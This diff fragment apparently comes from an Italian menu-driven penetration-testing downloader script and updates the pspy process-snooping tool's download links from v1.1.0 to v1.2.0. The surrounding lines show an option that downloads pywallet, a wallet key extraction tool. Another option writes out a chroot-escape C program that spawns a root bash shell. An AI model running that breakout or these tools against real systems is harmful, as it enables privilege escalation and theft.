@@ -626,10 +626,10 @@ while true; do
 		Scarica "mikeborghi/pywallet" "$ENTRAW""mikeborghi/pywallet/master/pywallet.py" "pywallet.py"
 	;;
 	"159")
-		Scarica "DominicBreuker/pspy64s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.1.0/pspy64s" "pspy64s"
+		Scarica "DominicBreuker/pspy64s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.2.0/pspy64s" "pspy64s"
 	;;
 	"160")
-		Scarica "DominicBreuker/pspy32s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.1.0/pspy32s" "pspy32s"
+		Scarica "DominicBreuker/pspy32s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.2.0/pspy32s" "pspy32s"
 	;;
 	"161")
 		echo -e "#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void){\nmkdir(\"chroot-dir\", 0755);\nchroot(\"chroot-dir\");\nfor(int i = 0; i < 1000; i++){\nchdir(\"..\");\n}\nchroot(\".\");\nsystem(\"/bin/bash\");\n}" > root4.c
